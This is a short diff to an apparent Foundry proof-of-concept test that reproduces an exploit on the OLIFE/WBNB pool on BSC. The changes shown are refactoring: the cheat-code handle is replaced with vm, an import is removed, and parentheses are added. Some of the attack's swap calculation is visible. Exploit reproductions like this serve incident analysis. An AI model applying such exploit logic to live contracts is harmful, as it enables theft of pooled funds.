@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @Analysis
 // https://twitter.com/BeosinAlert/status/1648520494516420608
@@ -33,10 +32,8 @@ contract ContractTest is Test {
 
     address constant dodo = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() external {
-        cheats.createSelectFork("bsc", 27_470_678);
+        vm.createSelectFork("bsc", 27_470_678);
     }
 
     function testExploit() external {
@@ -86,7 +83,7 @@ contract ContractTest is Test {
         (uint256 oldOlifeReserve, uint256 bnbReserve,) = OLIFE_WBNB_LPPool.getReserves();
         uint256 newolifeReserve = OLIFE.balanceOf(address(OLIFE_WBNB_LPPool));
         uint256 amountin = newolifeReserve - oldOlifeReserve;
-        uint256 swapAmount = amountin * 9975 * bnbReserve / (oldOlifeReserve * 10_000 + amountin * 9975);
+        uint256 swapAmount = (amountin * 9975 * bnbReserve) / (oldOlifeReserve * 10_000 + amountin * 9975);
 
         //swap OLIFE to WBNB
         OLIFE_WBNB_LPPool.swap(0, swapAmount, address(this), "");
